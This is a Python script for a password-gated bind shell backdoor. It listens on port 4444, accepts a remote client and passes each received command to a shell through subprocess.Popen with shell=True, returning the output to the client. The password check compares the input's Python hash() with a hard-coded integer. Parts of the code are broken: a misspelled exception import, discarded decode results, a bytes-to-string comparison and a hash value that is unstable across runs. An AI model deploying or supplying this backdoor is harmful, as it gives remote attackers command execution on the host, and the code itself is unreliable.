import socket
from socket import error as SocetError
import subprocess

HOST = ''
PORT = 4444

server = socket.socket()
server.bind((HOST, PORT))


def login():    
    server.listen(1)
    global client, client_addr
    client, client_addr = server.accept()
    print('Connection established, login attempt')
    while True:
            try:                
                password = client.recv(1024)
                password.decode()
                print(password)
                if hash(password) == 1634504265594755506:
                        print('Login Success')
                        break
                else:
                    print('Failed Login')
            except SocketError as se:
                print('SocketError', se)                
                server.listen(1)
                client, client_addr = server.accept()
            except Exception as e:
                print('Exception', e)
                pass

print('Server Started')
print('Listening for Client Connection...')

login()

while True:
    	try:
            	print('Awaiting Command')
            	command = client.recv(1024)
            	command.decode()

            	if command == 'exit':
                    	continue

            	op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            	output = op.stdout.read()
            	output_error = op.stderr.read()
            	print('Sending Response')

            	#print(output + output_error)
            	if output + output_error == '':
                    	client.send('no stdout')
            	else:
                    	client.send(output + output_error)
    	except Exception as e:
                print('Main Loop Exception', e)
                login()

server.close()
print('Connection Closed')
